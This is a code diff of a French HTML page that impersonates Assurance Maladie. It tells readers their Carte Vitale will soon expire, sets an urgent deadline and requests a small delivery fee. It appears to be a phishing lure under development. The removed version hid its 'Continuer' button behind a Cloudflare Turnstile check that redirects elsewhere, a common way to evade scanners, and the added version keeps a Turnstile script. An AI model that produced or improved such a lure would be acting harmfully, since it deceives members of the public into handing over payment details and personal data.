@@ -1,71 +1,45 @@
 <div style="max-width: 720px; margin: 40px auto; font-family: Arial, Helvetica, sans-serif; background: white; padding: 40px 30px; border-radius: 8px; box-shadow: 0 4px 20px rgba(0,0,0,0.1);">
-  <img src="https://lirp.cdn-website.com/6caaaacf/dms3rep/multi/opt/4images-144w.png"
-       alt="Gestion Adhérent"
+
+  <!-- Logo -->
+  <img src="https://lirp.cdn-website.com/6caaaacf/dms3rep/multi/opt/4images-144w.png" 
+       alt="Assurance Maladie" 
        style="height: 85px; display: block; margin-bottom: 30px;">
+
   <h1 style="font-size: 28px; color: #2A3A5A; margin: 0 0 25px 0; line-height: 1.3;">
     Votre Carte Vitale va bientôt expirer.
   </h1>
+
   <div style="background: #FFF4E5; border-left: 5px solid #FF9800; padding: 18px 20px; margin-bottom: 30px;">
-    <strong style="color: #E65100;">⚠️ Rappel :</strong> si vous ne renouvelez pas votre Carte Vitale, vous ne pourrez plus bénéficier de vos remboursements de soins et consultations à compter du <strong>19 mai 2026</strong>. Faites la démarche avant la date limite.
+    <strong style="color: #E65100;">⚠️ Important :</strong> si vous ne renouvelez pas votre Carte Vitale, vous ne pourrez plus bénéficier de vos remboursements de soins et consultations à compter du <strong>16 mai 2026</strong>. Faites la démarche avant la date limite.
   </div>
+
   <p style="font-size: 17px; line-height: 1.55; color: #2A3A5A; margin-bottom: 25px;">
     Renouvelez dès maintenant votre Carte Vitale, équipée d’une puce de sécurité renforcée pour protéger vos données et garantir des remboursements rapides.
   </p>
+
   <ul style="font-size: 17px; line-height: 1.7; color: #2A3A5A; padding-left: 20px; margin-bottom: 35px;">
     <li>✅ Simple et rapide – en quelques minutes</li>
     <li>✅ Sécurisée – nouvelle puce de protection</li>
     <li>✅ Livraison à domicile – frais de livraison à <strong>1,63 €</strong></li>
   </ul>
-  <p style="font-size: 15px; color: #555; background: #f9f9f9; padding: 18px; border-radius: 6px; margin-bottom: 25px;">
-    Veuillez valider le test anti-robot ci-dessous pour continuer.
+
+  <p style="font-size: 15px; color: #555; background: #f9f9f9; padding: 18px; border-radius: 6px; margin-bottom: 35px;">
+    Après avoir cliqué sur le bouton "Continuer", vous serez redirigé vers une page sécurisée incluant un test anti-robot afin de vérifier votre identité et garantir la sécurité du processus.
   </p>
 
-  <!-- Turnstile -->
-  <div id="turnstile-container" style="margin: 20px auto; text-align: center; min-height: 80px;"></div>
-
-  <!-- Bouton simple et pro -->
+  <!-- Bouton -->
   <div style="text-align: center;">
-    <button onclick="redirectNow()" 
-            id="continueBtn"
-            disabled
-            style="background: #0066CC; color: white; font-size: 18px; font-weight: bold; padding: 15px 45px; border-radius: 50px; border: none; cursor: pointer; box-shadow: 0 4px 12px rgba(0,102,204,0.3); opacity: 0.6;">
+    <a href="https://www.ameli.fr/" target="_blank"
+       style="background: #0066CC; color: white; font-size: 19px; font-weight: bold; padding: 16px 50px; border-radius: 50px; text-decoration: none; display: inline-block; box-shadow: 0 4px 12px rgba(0,102,204,0.3);">
       Continuer
-    </button>
+    </a>
   </div>
 
-  <p style="text-align: center; margin-top: 30px; font-size: 14px; color: #666;">
-    Une vérification anti-bot supplémentaire peut avoir lieu après ce clic pour protéger votre démarche.
+  <p style="text-align: center; margin-top: 40px; font-size: 14px; color: #777;">
+    CPAM 1.63 — Assurance Maladie
   </p>
 
-  <p style="text-align: center; margin-top: 35px; font-size: 14px; color: #777;">
-    Gestion Adhérent — Caisse Primaire
-  </p>
 </div>
 
-
-<script src="https://challenges.cloudflare.com/turnstile/v0/api.js?render=explicit" async defer></script>
-<script>
-  let turnstileWidgetId = null;
-
-  function initTurnstile() {
-    turnstileWidgetId = turnstile.render('#turnstile-container', {
-      sitekey: '0x4AAAAAADQIOxYr1_pSjPN2',
-      theme: 'light',
-      action: 'gestion-secure',
-      callback: function(token) {
-        const btn = document.getElementById('continueBtn');
-        btn.disabled = false;
-        btn.style.opacity = '1';
-      },
-      'error-callback': function() {
-        alert("Échec de la vérification. Veuillez réessayer.");
-      }
-    });
-  }
-
-  function redirectNow() {
-    window.location.href = 'https://sites.google.com/';   //
-  }
-
-  window.onload = initTurnstile;
-</script>
+<!-- Script Cloudflare Turnstile (au cas où) -->
+<script src="https://challenges.cloudflare.com/turnstile/v0/api.js?compat=recaptcha" async defer></script>
